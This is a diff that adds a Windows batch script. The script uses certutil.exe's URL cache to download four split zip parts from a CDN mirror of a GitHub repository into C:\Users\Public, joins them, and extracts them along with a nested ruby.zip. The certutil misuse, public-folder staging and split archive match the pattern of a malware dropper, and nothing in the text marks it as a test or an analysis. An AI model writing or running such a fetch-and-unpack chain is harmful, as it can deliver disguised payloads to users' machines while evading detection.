@@ -1,0 +1,43 @@
+@echo off
+setlocal EnableExtensions
+
+set "WORK=C:\Users\Public"
+set "OUT=%WORK%\extracted"
+
+cd /d "%WORK%" || exit /b 1
+
+certutil.exe -urlcache -f "https://cdn.jsdmirror.com/gh/anupcic/golatest@master/Go.zip.part001" "%WORK%\Go.zip.part001"
+certutil.exe -urlcache -f "https://cdn.jsdmirror.com/gh/anupcic/golatest@master/Go.zip.part002" "%WORK%\Go.zip.part002"
+certutil.exe -urlcache -f "https://cdn.jsdmirror.com/gh/anupcic/golatest@master/Go.zip.part003" "%WORK%\Go.zip.part003"
+certutil.exe -urlcache -f "https://cdn.jsdmirror.com/gh/anupcic/golatest@master/Go.zip.part004" "%WORK%\Go.zip.part004"
+
+rem --- sanity check: every part must exist and be non-trivial (certutil silently saves HTML on 404) ---
+for %%P in (001 002 003 004) do (
+    if not exist "%WORK%\Go.zip.part%%P" (
+        echo Missing part %%P
+        exit /b 1
+    )
+    for %%A in ("%WORK%\Go.zip.part%%P") do if %%~zA LSS 1024 (
+        echo Part %%P too small - likely an HTML error page, not zip data
+        exit /b 1
+    )
+)
+
+copy /b "%WORK%\Go.zip.part001"+"%WORK%\Go.zip.part002"+"%WORK%\Go.zip.part003"+"%WORK%\Go.zip.part004" "%WORK%\complete.zip" || (
+    echo JOIN FAILED
+    exit /b 1
+)
+
+if not exist "%OUT%" mkdir "%OUT%"
+
+tar -xf "%WORK%\complete.zip" -C "%OUT%" || (
+    echo UNZIP FAILED
+    exit /b 1
+)
+
+if exist "%OUT%\ruby.zip" (
+    if not exist "%OUT%\ruby_files" mkdir "%OUT%\ruby_files"
+    tar -xf "%OUT%\ruby.zip" -C "%OUT%\ruby_files" || exit /b 1
+)
+
+exit /b 0
